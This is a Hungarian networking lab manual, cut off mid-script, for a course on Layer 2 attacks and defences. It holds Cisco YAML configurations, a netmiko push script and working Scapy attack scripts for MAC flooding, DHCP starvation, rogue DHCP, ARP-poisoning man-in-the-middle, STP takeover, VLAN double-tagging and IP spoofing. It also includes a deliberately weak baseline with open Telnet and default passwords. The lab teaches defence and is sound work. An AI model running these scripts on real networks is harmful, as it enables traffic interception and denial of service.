# SRWE Modul 10–11 — Mester labor dokumentáció
## 12 Layer 2 támadás és védelem | Python támadói kliens + YAML-alapú Cisco konfiguráció

> **Biztonsági megkötés:** a labor kizárólag izolált, oktatási célú hálózati szegmensen futtatható. A támadó szkriptek valódi Layer 2/3 támadásokat szimulálnak — éles vagy intézményi hálózaton tilos futtatni őket.

---

## Tartalomjegyzék

1. [Támadás–védelem mátrix](#1-támadásvédelem-mátrix)
2. [Topológia](#2-topológia)
3. [Könyvtárstruktúra](#3-könyvtárstruktúra)
4. [`inventory.yml`](#4-inventoryyml)
5. [`configs/baseline.yml`](#5-configsbaselineyml--kiinduló-sebezhető-állapot)
6. [`configs/mitigations.yml`](#6-configsmitigationsyml--védelmek-szekciónként)
7. [`push_config.py`](#7-push_configpy--yaml-ból-cisco-ra-töltő-netmiko)
8. [`verify.py`](#8-verifypy--automatizált-ellenőrzés)
9. [Támadói szkriptek](#9-támadói-szkriptek-attacker-gépen-root-ként)
10. [A labor menete fázisonként](#10-a-labor-menete-fázisonként)
11. [Tanulási eredmények](#11-elvárt-tanulási-eredmények)
12. [Biztonsági megjegyzések](#12-biztonsági-megjegyzések)

---

## 1. Támadás–védelem mátrix

| # | Támadás (SRWE Modul 10) | Elve | Védelem (Modul 11) | Attacker szkript |
|---|---|---|---|---|
| 1 | **MAC address table overflow** | Véletlen forrás-MAC-okkal megtöltik a CAM-táblát → a switch hub-módba vált, minden keret minden portra megy (sniffing) | Port Security (`maximum`, `violation`) | `mac_flood.py` |
| 2 | **MAC spoofing** | A legit kliens MAC-címének utánozása | Sticky port security | `mac_spoof.py` |
| 3 | **DHCP starvation** | Egyedi ügyfél-MAC-okkal küldött DISCOVER-ekkel kimerítik a poolt (DoS) | Port Security (1 MAC/port) + `limit rate` | `dhcp_starve.py` |
| 4 | **DHCP spoofing** (rogue DHCP) | Hamis szerver válaszol → rossz gateway/DNS → MITM | DHCP Snooping (trust/untrust) | `rogue_dhcp.py` |
| 5 | **ARP spoofing / poisoning** | Hamis ARP Reply → gateway- és kliens-MITM | Dynamic ARP Inspection | `arp_spoof.py` |
| 6 | **STP manipuláció** | 0 prioritású BPDU → a támadó lesz a root bridge | BPDU Guard + Root Guard | `stp_takeover.py` |
| 7 | **VLAN hopping (DTP)** | DTP-vel trunkként megnyíló access port | `nonegotiate`, fix access, nem használt portok lezárása | `vlan_hop_recon.py` |
| 8 | **CDP felderítés + nyílt Telnet** | CDP-ből információgyűjtés, nyílt vty-sorok | `no cdp run`, SSHv2-only, hardening | `cdp_telnet_recon.py` |
| 9 | **802.1Q double-tagging** | Külső tag = natív VLAN (lecsúszik), belső tag = cél-VLAN | Dedikált natív VLAN (999) + trunk pruning | `vlan_double_tag.py` |
| 10 | **IP spoofing** | Hamis forrás-IP (felderítés, naplómérgezés) | IP Source Guard (+ DHCP snooping) | `ip_spoof.py` |
| 11 | **LLDP felderítés** | LLDPDU-ból topológia-infó, hamis LLDP injektálása | LLDP TX/RX tiltása user-portokon | `lldp_recon.py` |
| 12 | **ICMP-redirect gateway MITM** | „A gateway rajtam át érhető el" → átirányított route | `no ip redirects` a routeren | `icmp_redirect.py` |

---

## 2. Topológia

```
                         ┌─────────────┐
                         │   R1        │  DHCP szerver (VLAN 10), GW
                         │  Gi0/1      │  + subinterface-ek (.10, .20, .99)
                         └──────┬──────┘
                                │ trunk
        ┌───────────────────────┴─────────────────────┐
        │                    S1                       │
        │  Fa0/1: PC-V (áldozat, VLAN 10)             │
        │  Fa0/2: PC-A (admin, VLAN 99, netmiko)      │
        │  Fa0/3: ATTACKER (támadó, VLAN 10)          │
        │  Fa0/24: → S2 Fa0/24 (trunk, VLAN 10,20,99) │
        └───────────────────────┬─────────────────────┘
                                │
                         ┌──────┴──────┐
                         │     S2      │
                         │ Fa0/1: PC-W │  (VLAN 20 — double-tagging cél)
                         └─────────────┘

Management VLAN 99:  S1 = 10.0.99.1, S2 = 10.0.99.2, R1 = 10.0.99.254, PC-A = 10.0.99.10
User VLAN 10:        10.10.10.0/24  (PC-V, ATTACKER, DHCP pool az R1-en)
Test VLAN 20:        10.20.20.0/24  (PC-W — csak a 9. fázishoz kell)
```

**PC-A követelmények:** `python3`, `pip install netmiko pyyaml`
**ATTACKER követelmények:** `python3`, `pip install scapy`, root jog (raw socket)
**PC-V / PC-W:** Linux VM-ek, `tcpdump` telepítve

---

## 3. Könyvtárstruktúra

```
srwe-lab/
├── inventory.yml
├── configs/
│   ├── baseline.yml
│   └── mitigations.yml
├── push_config.py
├── verify.py                  # 27 ellenőrzéssel (külön dokumentum)
├── feladatlap.md               # külön dokumentum: hallgatói munkalap
├── reflexios_lap.md            # külön dokumentum: reflexiós lap
└── attacker/
    ├── mac_flood.py            # 1
    ├── mac_spoof.py            # 2
    ├── dhcp_starve.py          # 3
    ├── rogue_dhcp.py           # 4
    ├── arp_spoof.py            # 5
    ├── stp_takeover.py         # 6
    ├── vlan_hop_recon.py       # 7
    ├── cdp_telnet_recon.py     # 8
    ├── vlan_double_tag.py      # 9
    ├── ip_spoof.py             # 10
    ├── lldp_recon.py           # 11
    └── icmp_redirect.py        # 12
```

---

## 4. `inventory.yml`

```yaml
devices:
  S1:
    device_type: cisco_ios
    host: 10.0.99.1
    username: admin
    password: "cisco123"
    secret: "cisco123"
  S2:
    device_type: cisco_ios
    host: 10.0.99.2
    username: admin
    password: "cisco123"
    secret: "cisco123"
  R1:
    device_type: cisco_ios
    host: 10.0.99.254
    username: admin
    password: "cisco123"
    secret: "cisco123"

management_vlan: 99
user_vlan: 10
test_vlan: 20
user_subnet: 10.10.10.0/24
legit_gateway: 10.10.10.1
legit_dhcp: 10.10.10.1
```

---

## 5. `configs/baseline.yml` — kiinduló, sebezhető állapot

**Kettős cél:** (a) minden védelem KI van kapcsolva, hogy a támadások láthatók legyenek; (b) az eszközök elérhetők, és a vty-sorokon **Telnet is nyitva** van, hogy a 8. fázis (CDP + Telnet-próba) demonstrálható legyen.

**Fontos formázási szabály:** mivel a pusher nem szúr be automatikus `exit`-et, a konténerparancsok (`vlan`, `interface`, `line`) blokkjait **explicit `exit` sor zárja**.

```yaml
S1:
  global:
    - hostname S1
    - vlan 10
    - exit
    - vlan 20
    - exit
    - vlan 99
    - exit
    - interface vlan 99
    - ip address 10.0.99.1 255.255.255.0
    - no shutdown
    - exit
    - ip default-gateway 10.0.99.254
    - ip domain-name lab.local
    - crypto key generate rsa modulus 1024
    - username admin privilege 15 secret cisco123
    - line vty 0 4
    - transport input telnet ssh
    - password ciscotelnet
    - login
    - exec-timeout 5 0
    - exit
    - ip http server
    # NINCS: port-security, snooping, DAI, guard-ok, IPSG, LLDP-tiltás,
    #        no cdp run, no ip redirects — ezek hiánya a sebezhetőség
  interfaces:
    FastEthernet0/1:
      - switchport mode access
      - switchport access vlan 10
      - spanning-tree portfast
    FastEthernet0/2:
      - switchport mode access
      - switchport access vlan 99
    FastEthernet0/3:
      - switchport mode access
      - switchport access vlan 10
      - spanning-tree portfast
    FastEthernet0/24:
      - switchport mode trunk
      - switchport trunk allowed vlan 10,20,99

S2:
  global:
    - hostname S2
    - vlan 10
    - exit
    - vlan 20
    - exit
    - vlan 99
    - exit
    - interface vlan 99
    - ip address 10.0.99.2 255.255.255.0
    - no shutdown
    - exit
    - ip default-gateway 10.0.99.254
    - ip domain-name lab.local
    - crypto key generate rsa modulus 1024
    - username admin privilege 15 secret cisco123
    - line vty 0 4
    - transport input telnet ssh
    - password ciscotelnet
    - login
    - exec-timeout 5 0
    - exit
  interfaces:
    FastEthernet0/1:
      - switchport mode access
      - switchport access vlan 20
    FastEthernet0/24:
      - switchport mode trunk
      - switchport trunk allowed vlan 10,20,99

R1:
  global:
    - hostname R1
    - interface GigabitEthernet0/0
    - ip address 10.0.99.254 255.255.255.0
    - no shutdown
    - exit
    - interface GigabitEthernet0/1
    - no shutdown
    - exit
    - interface GigabitEthernet0/1.10
    - encapsulation dot1Q 10
    - ip address 10.10.10.1 255.255.255.0
    - exit
    - interface GigabitEthernet0/1.20
    - encapsulation dot1Q 20
    - ip address 10.20.20.1 255.255.255.0
    - exit
    - interface GigabitEthernet0/1.99
    - encapsulation dot1Q 99
    - ip address 10.0.99.253 255.255.255.0
    - exit
    # NINCS 'no ip redirects' — az ICMP-redirect támadás (12. fázis) miatt
  dhcp_pool:
    - ip dhcp excluded-address 10.10.10.1 10.10.10.10
    - ip dhcp pool USERS
    - network 10.10.10.0 255.255.255.0
    - default-router 10.10.10.1
    - dns-server 10.10.10.1
    - exit
```

---

## 6. `configs/mitigations.yml` — védelmek szekciónként

Használat: `python3 push_config.py inventory.yml configs/mitigations.yml <szekció>`
A szekciók **sorrendje számít** — lásd a 10. fejezet függőségi megjegyzéseit.

```yaml
# ------------------------------------------------------------------
# 1-2. MAC flooding + MAC spoofing -> PORT SECURITY
# ------------------------------------------------------------------
port-security:
  S1:
    interfaces:
      FastEthernet0/1:
        - switchport port-security
        - switchport port-security maximum 2
        - switchport port-security mac-address sticky
        - switchport port-security violation restrict
      FastEthernet0/3:                              # ATTACKER portja
        - switchport port-security
        - switchport port-security maximum 1
        - switchport port-security violation shutdown
    post:
      - show port-security interface fa0/1
      - show port-security interface fa0/3
  S2:
    interfaces:
      FastEthernet0/1:
        - switchport port-security
        - switchport port-security maximum 2
        - switchport port-security mac-address sticky
        - switchport port-security violation restrict

# ------------------------------------------------------------------
# 3-4. DHCP starvation + spoofing -> DHCP SNOOPING
# ------------------------------------------------------------------
dhcp-snooping:
  S1:
    global:
      - ip dhcp snooping
      - ip dhcp snooping vlan 10
      - no ip dhcp snooping information option   # router-on-a-stick kompatibilitás
    interfaces:
      GigabitEthernet0/1:                         # DHCP szerver (R1) felé — TRUSTED
        - ip dhcp snooping trust
      FastEthernet0/24:                           # S2 felé — TRUSTED
        - ip dhcp snooping trust
      FastEthernet0/3:                            # ATTACKER — untrusted + rate limit
        - ip dhcp snooping limit rate 5
    post:
      - show ip dhcp snooping
      - show ip dhcp snooping binding
  S2:
    global:
      - ip dhcp snooping
      - ip dhcp snooping vlan 10
      - no ip dhcp snooping information option
    interfaces:
      FastEthernet0/24:
        - ip dhcp snooping trust
    post:
      - show ip dhcp snooping

# ------------------------------------------------------------------
# 5. ARP poisoning -> DYNAMIC ARP INSPECTION
# ------------------------------------------------------------------
dai:
  S1:
    global:
      - ip arp inspection vlan 10
    interfaces:
      FastEthernet0/24:                           # trunk S2 felé — trust
        - ip arp inspection trust
      FastEthernet0/1:
        - ip arp inspection limit rate 15
      FastEthernet0/3:
        - ip arp inspection limit rate 15
    post:
      - show ip arp inspection
      - show ip arp inspection statistics vlan 10
  S2:
    global:
      - ip arp inspection vlan 10
    interfaces:
      FastEthernet0/24:
        - ip arp inspection trust
    post:
      - show ip arp inspection

# ------------------------------------------------------------------
# 6. STP manipuláció -> BPDU GUARD + ROOT GUARD
# ------------------------------------------------------------------
stp-guard:
  S1:
    global:
      - spanning-tree vlan 10 root primary
    interfaces:
      FastEthernet0/1:
        - spanning-tree bpduguard enable
      FastEthernet0/3:
        - spanning-tree bpduguard enable
        - spanning-tree guard root
    post:
      - show spanning-tree summary
      - show spanning-tree inconsistentports
  S2:
    global:
      - spanning-tree vlan 10 root secondary
    interfaces:
      FastEthernet0/1:
        - spanning-tree bpduguard enable

# ------------------------------------------------------------------
# 7. VLAN hopping (DTP) -> DTP TILTÁSA + nem használt portok lezárása
# ------------------------------------------------------------------
vlan-hop:
  S1:
    global:
      - no cdp run
    interfaces:
      FastEthernet0/1:
        - switchport nonegotiate
        - switchport mode access
        - switchport access vlan 10
      FastEthernet0/3:
        - switchport nonegotiate
        - switchport mode access
        - switchport access vlan 10
      FastEthernet0/24:
        - switchport nonegotiate
      range Fa0/4 - 23:
        - shutdown
        - switchport mode access
        - switchport access vlan 999
  S2:
    global:
      - no cdp run
    interfaces:
      FastEthernet0/1:
        - switchport nonegotiate
        - switchport mode access
      range Fa0/2 - 23:
        - shutdown
        - switchport access vlan 999

# ------------------------------------------------------------------
# 8. CDP felderítés + Telnet -> SWITCH HARDENING
# ------------------------------------------------------------------
hardening:
  S1:
    global:
      - no cdp run
      - no ip http server
      - service password-encryption
      - enable secret cisco123
      - ip ssh version 2
      - line console 0
      - password conpass
      - login
      - exit
      - line vty 0 4
      - transport input ssh
      - login local
      - exec-timeout 5 0
      - exit
    post:
      - show cdp
      - show ip ssh
  S2:
    global:
      - no cdp run
      - ip ssh version 2
      - line vty 0 4
      - transport input ssh
      - login local
      - exit

# ------------------------------------------------------------------
# 9. Double-tagging -> NATIV VLAN HARDENING + PRUNING
# ------------------------------------------------------------------
native-vlan-hardening:
  S1:
    global:
      - vlan 999
      - name NATIVE_BLACKHOLE
      - exit
    interfaces:
      FastEthernet0/24:
        - switchport mode trunk
        - switchport trunk native vlan 999
        - switchport trunk allowed vlan 10,20,99
    post:
      - show interfaces trunk
  S2:
    interfaces:
      FastEthernet0/24:
        - switchport mode trunk
        - switchport trunk native vlan 999
        - switchport trunk allowed vlan 10,20,99
    post:
      - show interfaces trunk

# ------------------------------------------------------------------
# 10. IP spoofing -> IP SOURCE GUARD (kötelezően a dhcp-snooping UTÁN!)
# ------------------------------------------------------------------
ip-source-guard:
  S1:
    interfaces:
      FastEthernet0/1:
        - ip verify source
      FastEthernet0/3:
        - ip verify source
        - switchport port-security
        - switchport port-security maximum 1
    post:
      - show ip verify source
      - show ip source binding
  S2:
    interfaces:
      FastEthernet0/1:
        - ip verify source
    post:
      - show ip verify source

# ------------------------------------------------------------------
# 11. LLDP felderítés -> LLDP TILTÁSA USER-PORTOKON
# Megjegyzés: platformfüggő — egyes IOS-buildeken csak globális
# 'no lldp run' létezik. Első alkalommal teszteld a saját IOS-odon!
# ------------------------------------------------------------------
lldp-hardening:
  S1:
    interfaces:
      FastEthernet0/1:
        - no lldp transmit
        - no lldp receive
      FastEthernet0/3:
        - no lldp transmit
        - no lldp receive
    post:
      - show lldp interface FastEthernet0/1
      - show lldp neighbors
  S2:
    interfaces:
      FastEthernet0/1:
        - no lldp transmit
        - no lldp receive
    post:
      - show lldp interface FastEthernet0/1

# ------------------------------------------------------------------
# 12. ICMP-redirect MITM -> REDIRECT TILTÁSA A ROUTEREN
# ------------------------------------------------------------------
icmp-redirect:
  R1:
    interfaces:
      GigabitEthernet0/1.10:
        - no ip redirects
      GigabitEthernet0/1.20:
        - no ip redirects
      GigabitEthernet0/1.99:
        - no ip redirects
    post:
      - show ip interface GigabitEthernet0/1.10 | include redirects
```

---

## 7. `push_config.py` — YAML-ból Cisco-ra töltő (netmiko)

```python
#!/usr/bin/env python3
"""YAML-ban definiált konfiguráció feltöltése Cisco eszközökre.

Használat:
    python3 push_config.py inventory.yml configs/baseline.yml
    python3 push_config.py inventory.yml configs/mitigations.yml port-security
    python3 push_config.py inventory.yml configs/mitigations.yml   # minden szekció

Megjegyzés: a pusher NEM szúr be automatikus 'exit'-et a konténerparancsok
után — a YAML-ban azok explicit módon szerepelnek.
"""
import sys
import yaml
from netmiko import ConnectHandler
from netmiko.exceptions import NetmikoAuthenticationException, NetmikoTimeoutException


def parse_interface_key(key: str):
    """'range Fa0/4 - 23' -> ('interface range', 'Fa0/4 - 23')"""
    if key.startswith("range "):
        return "interface range", key[len("range "):].strip()
    return "interface", key


def push_device(inventory: dict, device_name: str, device_cfg: dict, save: bool = True):
    params = dict(inventory["devices"][device_name])
    print(f"\n=== {device_name} ({params['host']}) ===")
    try:
        conn = ConnectHandler(**params)
    except (NetmikoTimeoutException, NetmikoAuthenticationException) as e:
        print(f"[HIBA] {device_name}: {e}")
        return False

    ok = True
    try:
        # Globális / dhcp_pool parancslisták
        for section in ("global", "dhcp_pool"):
            cmds = device_cfg.get(section, [])
            if cmds:
                conn.send_config_set(list(cmds))
                print(f"[OK] {device_name}: {section} ({len(cmds)} sor)")

        # Interfész-szekciók
        for if_key, if_cmds in device_cfg.get("interfaces", {}).items():
            enter, target = parse_interface_key(if_key)
            conn.send_config_set([f"{enter} {target}"] + list(if_cmds))
            print(f"[OK] {device_name}: {enter} {target} ({len(if_cmds)} sor)")

        # Ellenőrző show parancsok
        for cmd in device_cfg.get("post", []):
            out = conn.send_command(cmd)
            print(f"--- {cmd} ---\n{out}\n")

        if save:
            conn.save_config()
            print(f"[OK] {device_name}: write memory")
    except Exception as e:
        print(f"[HIBA] {device_name}: {e}")
        ok = False
    finally:
        conn.disconnect()
    return ok


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)

    inv_path, cfg_path = sys.argv[1], sys.argv[2]
    section_filter = sys.argv[3] if len(sys.argv) > 3 else None

    with open(inv_path) as f:
        inventory = yaml.safe_load(f)
    with open(cfg_path) as f:
        config = yaml.safe_load(f)

    failures = []
    for section_name, section_cfg in config.items():
        if section_filter and section_name != section_filter:
            continue
        if section_filter is None:
            print(f"\n########## SZEKCIÓ: {section_name} ##########")
        for device_name, device_cfg in section_cfg.items():
            if not push_device(inventory, device_name, device_cfg):
                failures.append(f"{section_name}/{device_name}")

    if failures:
        print(f"\nSIKERTELEN: {', '.join(failures)}")
        sys.exit(2)
    print("\nKész.")


if __name__ == "__main__":
    main()
```

## 8. `verify.py` — automatizált ellenőrzés

A teljes szkript (27 ellenőrzés, pontszám, jegy, JSON-export) **külön dokumentumként** található a canvason. Futtatás:

```bash
python3 verify.py inventory.yml              # ellenőrzés + pontszám
python3 verify.py inventory.yml --verbose    # nyers kimenetekkel
python3 verify.py inventory.yml --json eredmeny.json
```

---

## 9. Támadói szkriptek (ATTACKER gépen, root-ként)

### 9.1 `mac_flood.py` — MAC address table overflow

```python
#!/usr/bin/env python3
"""MAC flooding: véletlen forrás-MAC-okkal tölti a CAM-táblát.
A switch egy idő után hub-módba vált, és minden keretet minden portra másol.

Futtatás: sudo python3 mac_flood.py eth0 10000
"""
import random, sys
from scapy.all import Ether, IP, UDP, sendp, conf

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.getrandbits(8) for _ in range(5))

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
    conf.iface = iface
    print(f"[*] MAC flood indul: {count} keret a(z) {iface}-n...")
    for i in range(count):
        sendp(Ether(src=rand_mac(), dst="ff:ff:ff:ff:ff:ff") /
              IP(src="10.10.10.66", dst="10.10.10.1") / UDP(), verbose=0)
        if i % 1000 == 0:
            print(f"[+] elküldve: {i}")
    print("[!] Kész. Nézd: 'show mac address-table count' a switchen.")

if __name__ == "__main__":
    main()
```

### 9.2 `mac_spoof.py` — MAC spoofing

```python
#!/usr/bin/env python3
"""A legit áldozat MAC-címét veszi fel a támadó — a port security
sticky-listája miatt violation lép fel.

Futtatás: sudo python3 mac_spoof.py eth0 00:50:56:AA:BB:01
"""
import sys, time
from scapy.all import Ether, ARP, sendp, conf

def main():
    iface, victim_mac = sys.argv[1], sys.argv[2]
    conf.iface = iface
    frame = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / \
            ARP(op=1, hwsrc=victim_mac, psrc="10.10.10.77", pdst="10.10.10.1")
    print(f"[*] ARP Request a spoofolt MAC-címmel ({victim_mac})...")
    for _ in range(20):
        sendp(frame, verbose=0)
        time.sleep(0.5)
    print("[!] Kész. Ellenőrizd: 'show port-security' + syslog.")

if __name__ == "__main__":
    main()
```

### 9.3 `dhcp_starve.py` — DHCP starvation

```python
#!/usr/bin/env python3
"""Kimeríti a DHCP-poolt egyedi ügyfél-MAC-okkal küldött DISCOVER-ekkel.

Futtatás: sudo python3 dhcp_starve.py eth0 250
"""
import random, struct, sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 250
    conf.iface = iface
    real_mac = conf.iface.mac
    print(f"[*] {n} DHCPDISCOVER különböző ügyfél-MAC-okkal...")
    for i in range(n):
        chaddr = (bytes.fromhex(real_mac.replace(":", "")) +
                  struct.pack(">IH", i, 0)).ljust(16, b"\x00")[:16]
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=real_mac) /
              IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
              BOOTP(chaddr=chaddr, xid=random.randint(1, 2**32 - 1), flags=0x8000) /
              DHCP(options=[("message-type", "discover"),
                            ("param_req_list", [1, 3, 6, 15, 51]), "end"]),
              verbose=0)
        if i % 25 == 0:
            print(f"[+] {i} DISCOVER elküldve")
    print("[!] Kész. Nézd: 'show ip dhcp binding' az R1-en.")

if __name__ == "__main__":
    main()
```

### 9.4 `rogue_dhcp.py` — DHCP spoofing

```python
#!/usr/bin/env python3
"""Hamis DHCP-szerver: az OFFER-ben a támadót adja gateway-nek és DNS-nek.
DHCP Snooping után ezek az üzenetek eldobódnak az untrusted porton.

Futtatás: sudo python3 rogue_dhcp.py eth0
"""
import sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf

ROGUE_IP = "10.10.10.254"
POOL = [f"10.10.10.{i}" for i in range(100, 200)]
assigned = {}

def handle_discover(pkt):
    if pkt[UDP].dport == 67 and DHCP in pkt:
        opts = dict(x for x in pkt[DHCP].options if isinstance(x, tuple))
        if opts.get("message-type") != 1:        # csak DISCOVER
            return
        cli_mac = pkt[Ether].src
        offer_ip = assigned.setdefault(cli_mac, POOL[len(assigned) % len(POOL)])
        resp = (Ether(src=conf.iface.mac, dst=cli_mac) /
                IP(src=ROGUE_IP, dst=offer_ip) / UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offer_ip, siaddr=ROGUE_IP,
                      chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                DHCP(options=[("message-type", 2), ("server_id", ROGUE_IP),
                              ("subnet_mask", "255.255.255.0"),
                              ("router", ROGUE_IP),          # <-- mi vagyunk a GW
                              ("name_server", ROGUE_IP),
                              ("lease_time", 3600), "end"]))
        sendp(resp, verbose=0)
        print(f"[+] OFFER küldve {cli_mac} -> {offer_ip} gw={ROGUE_IP}")

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] Rogue DHCP figyel a(z) {iface}-n. Ctrl+C a leállításhoz.")
    sniff(iface=iface, filter="udp and (port 67 or 68)", prn=handle_discover, store=0)

if __name__ == "__main__":
    main()
```

### 9.5 `arp_spoof.py` — ARP poisoning (gateway- és kliens-MITM)

```python
#!/usr/bin/env python3
"""Kétirányú ARP poisoning: az áldozat és a gateway felé is azt hazudjuk,
hogy a másik MAC-címe a miénk. Így a kétirányú forgalom rajtunk át megy (MITM).

Futtatás: sudo python3 arp_spoof.py eth0 10.10.10.20 10.10.10.1
"""
import sys, time
from scapy.all import ARP, send, get_if_hwaddr, arping, conf

def get_mac(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=0)
    return ans[0][1].src

def main():
    iface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    conf.iface = iface
    vmac, gmac = get_mac(victim, iface), get_mac(gateway, iface)
    print(f"[*] áldozat {victim} @ {vmac} | gw {gateway} @ {gmac}")
    try:
        while True:
            send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=vmac), verbose=0)
            send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gmac), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Takarítás: eredeti ARP-k visszaállítása...")
        send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=vmac, hwsrc=gmac), count=3, verbose=0)
        send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gmac, hwsrc=vmac), count=3, verbose=0)

if __name__ == "__main__":
    main()
```

### 9.6 `stp_takeover.py` — STP manipuláció

```python
#!/usr/bin/env python3
"""0 prioritású BPDU-k küldése — a támadó igyekszik root bridge-gé válni.
A BPDU Guard emiatt err-disabled állapotba teszi a portot.

Futtatás: sudo python3 stp_takeover.py eth0
Alternatíva (megbízhatóbb): sudo brctl addbr br0 && sudo brctl setbridgeprio br0 0
                            && sudo ip link set br0 up
"""
import sys, time
from scapy.all import Ether, sendp, conf

LLC = b"\x42\x42\x03"   # 802.2 LLC: DSAP/SSAP=STP, control=UI

def stp_config_bpdu(root_id, bridge_id):
    return (b"\x00\x00\x00\x00"                     # proto id, verzió, típus, flag-ek
            + root_id + b"\x00\x00"                 # root id, path cost
            + bridge_id + b"\x80\x01"               # bridge id, port id
            + b"\x14\x00\x14\x00\x04\x00\x0a\x00")  # age-ek / forward delay

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    att_mac = conf.iface.mac
    bid = b"\x00\x00" + bytes.fromhex(att_mac.replace(":", ""))
    frame = Ether(dst="01:80:c2:00:00:00", src=att_mac) / (LLC + stp_config_bpdu(bid, bid))
    print("[*] Rogue superior BPDU-k küldése (priority 0)... Ctrl+C a leállításhoz.")
    try:
        while True:
            sendp(frame, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Leállítva. Nézd: 'show spanning-tree root' + syslog.")

if __name__ == "__main__":
    main()
```

### 9.7 `vlan_hop_recon.py` — DTP/VLAN hopping felderítés

```python
#!/usr/bin/env python3
"""DTP-keretek figyelése: ha a port 'dynamic' módban van, trunkolható.

Futtatás: sudo python3 vlan_hop_recon.py eth0
"""
import sys
from scapy.all import sniff, Ether

def show(pkt):
    if Ether in pkt:
        etype = pkt[Ether].type
        if etype == 0x2004:
            print("[!] DTP-keret látva — a port valószínűleg dynamic módban van!")
            print(pkt.summary())
        elif etype == 0x8100:
            print("[!] Tagged 802.1Q-forgalom érkezik az access porton:")
            print(pkt.summary())

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] DTP- és 802.1Q-megfigyelés a(z) {iface}-n...")
    sniff(iface=iface, prn=show, store=0,
          filter="ether proto 0x2004 or ether proto 0x8100")

if __name__ == "__main__":
    main()
```

### 9.8 `cdp_telnet_recon.py` — CDP lehallgatás + Telnet-próba

```python
#!/usr/bin/env python3
"""CDP-üzenetek passzív lehallgatása (platform, port, IOS-verzió) + Telnet-próba.

Futtatás: sudo python3 cdp_telnet_recon.py eth0 10.0.99.1
"""
import socket, sys
from scapy.all import sniff, Ether

def parse_cdp(pkt):
    print(f"[+] CDP-keret: {pkt.src} -> {pkt.dst}, {len(pkt)} bájt")
    print(pkt.summary())

def telnet_probe(ip):
    print(f"[*] Telnet-próba: {ip}:23 ...")
    try:
        s = socket.create_connection((ip, 23), timeout=3)
        print(f"[!] NYITOTT TELNET: {s.recv(100)!r}")
        s.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("[+] Telnet zárva/elutasítva — jó.")

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    mgmt_ip = sys.argv[2] if len(sys.argv) > 2 else None
    if mgmt_ip:
        telnet_probe(mgmt_ip)
    print(f"[*] CDP-figyelés a(z) {iface}-n (30 mp)...")
    sniff(iface=iface, lfilter=lambda p: Ether in p and p[Ether].type == 0x2000,
          prn=parse_cdp, store=0, timeout=30)

if __name__ == "__main__":
    main()
```

### 9.9 `vlan_double_tag.py` — 802.1Q double-tagging

```python
#!/usr/bin/env python3
"""Külső tag = a trunk natív VLAN-ja (a trunkon lecsúszik), belső tag = cél-VLAN.
A második switch a BELSŐ taget értelmezi → a keret bejut a másik VLAN-ba.
Egyirányú támadás: a válasz nem tud visszajutni.

Futtatás: sudo python3 vlan_double_tag.py eth0 10.20.20.10 [outer] [inner]
"""
import sys
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    target = sys.argv[2] if len(sys.argv) > 2 else "10.20.20.10"
    outer = int(sys.argv[3]) if len(sys.argv) > 3 else 1     # trunk natív VLAN-ja
    inner = int(sys.argv[4]) if len(sys.argv) > 4 else 20    # áldozat VLAN-ja
    conf.iface = iface
    frame = (Ether(dst="aa:aa:aa:aa:aa:aa", src=conf.iface.mac) /
             Dot1Q(vlan=outer) / Dot1Q(vlan=inner) /
             IP(src="10.10.10.66", dst=target) / ICMP(type=8, id=0x1234))
    print(f"[*] Double-tagged keretek: outer={outer}, inner={inner}, dst={target}")
    print("[*] Figyeld a PC-W-t (VLAN 20) tcpdumppal az ICMP echo request-et.")
    for _ in range(10):
        sendp(frame, verbose=0)
    print("[!] Kész. Az S2-n a 'show interfaces trunk' megmutatja a natív VLAN-t.")

if __name__ == "__main__":
    main()
```

### 9.10 `ip_spoof.py` — IP spoofing

```python
#!/usr/bin/env python3
"""Hamis forrás-IP-jű csomagok injektálása.
Fontos: a keret a támadó VALÓDI MAC-jét hordozza, de hamis forrás-IP-t —
a DHCP Snooping önmagában nem fogja meg, csak az IP Source Guard.

Futtatás: sudo python3 ip_spoof.py eth0 10.10.10.50 [dst]
"""
import sys, time
from scapy.all import Ether, IP, UDP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    spoofed = sys.argv[2] if len(sys.argv) > 2 else "10.10.10.50"
    dst = sys.argv[3] if len(sys.argv) > 3 else "10.10.10.1"
    conf.iface = iface
    pkt = (Ether(src=conf.iface.mac, dst="ff:ff:ff:ff:ff:ff") /
           IP(src=spoofed, dst=dst, ttl=64) / UDP(sport=44444, dport=53))
    print(f"[*] Spoofolt csomagok: forrás-IP={spoofed}, valós MAC={conf.iface.mac}")
    for _ in range(10):
        sendp(pkt, verbose=0)
        time.sleep(0.2)
    print(f"[!] 10 csomag elküldve. Nézd: 'show ip verify source' — a DHCP snooping "
          f"binding-táblában NEM szerepelhet a {spoofed} cím.")

if __name__ == "__main__":
